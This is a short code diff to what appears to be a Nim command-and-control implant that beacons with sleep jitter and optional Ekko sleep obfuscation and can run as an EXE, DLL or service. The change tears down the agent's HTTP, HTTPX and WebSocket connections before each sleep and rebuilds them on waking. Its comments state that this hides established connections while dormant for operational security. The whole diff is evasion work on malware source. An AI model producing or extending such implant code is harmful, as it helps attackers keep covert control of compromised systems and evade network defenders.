@@ -201,6 +201,30 @@ proc performKeyExchange(profile: var Profile): tuple[success: bool, newUuid: str
     when defined(windows):
       result = profile.smbProfile.performKeyExchange()
 
+proc cleanupConnection(agent: Agent) =
+  ## Close profile connection to avoid keeping ESTABLISHED connections during sleep
+  case agent.profile.kind
+  of pkHttp:
+    agent.profile.httpProfile.cleanup()
+  of pkHttpx:
+    agent.profile.httpxProfile.cleanup()
+  of pkWebSocket:
+    agent.profile.wsProfile.cleanup()
+  else:
+    discard  # Other profiles don't need cleanup
+
+proc reconnectProfile(agent: Agent) =
+  ## Recreate profile connection after cleanup
+  case agent.profile.kind
+  of pkHttp:
+    agent.profile.httpProfile.reconnect()
+  of pkHttpx:
+    agent.profile.httpxProfile.reconnect()
+  of pkWebSocket:
+    agent.profile.wsProfile.reconnect()
+  else:
+    discard  # Other profiles don't need reconnect
+
 proc newAgent*(): Agent =
   ## Create a new agent instance
   result = Agent()
@@ -970,6 +994,14 @@ proc sleep*(agent: Agent) =
   debug "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
          "s, jitter: ", agent.jitter, "%)"
   
+  # Close connection before sleeping if sleep time > 0
+  # This prevents keeping ESTABLISHED connections while dormant (OPSEC benefit)
+  # Performance impact: Only recreates client AFTER sleep, not on every request
+  # For sleep=0 (continuous beaconing), this is skipped entirely
+  if sleepTime > 0:
+    debug "[DEBUG] Cleaning up profile connection before sleep"
+    cleanupConnection(agent)
+  
   # Use Ekko sleep obfuscation if enabled (only for sleeps > 2 seconds)
   when defined(windows):
     when defined(sleepObfuscationEkko):
@@ -983,6 +1015,13 @@ proc sleep*(agent: Agent) =
       os.sleep(sleepTime * 1000)
   else:
     os.sleep(sleepTime * 1000)
+  
+  # Reconnect after waking up if we cleaned up before
+  # Performance: Creating HttpClient object is cheap (~microseconds)
+  # Actual TCP/TLS handshake happens on first request, not here
+  if sleepTime > 0:
+    debug "[DEBUG] Reconnecting profile after sleep"
+    reconnectProfile(agent)
 
 proc runAgent*() =
   ## Main agent execution loop - called by all entry points (EXE, DLL, Service)
